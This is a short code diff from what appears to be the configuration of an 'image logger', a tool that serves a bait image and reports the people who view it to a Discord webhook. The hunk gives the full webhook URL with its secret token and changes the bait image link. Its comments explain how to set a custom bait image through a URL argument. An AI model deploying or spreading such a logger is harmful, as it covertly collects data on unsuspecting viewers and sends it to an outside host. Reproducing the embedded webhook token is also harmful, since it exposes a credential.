@@ -14,7 +14,7 @@ __author__ = "kira.1.9"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1432017553286500362/pexBBD9_Dw4rNVnXJN6CNvkKlBP6mXpO0mEDsxCBs8C4K33aFPgHfLZwv2zSM_naT_qp",
-    "image": "https://i.pinimg.com/564x/76/f6/eb/76f6eb36e0b18bfab0674f3d64b0db04.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRl9xhaaYFrt20570OwLhcl9Y73my5ve5U6wQ&s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
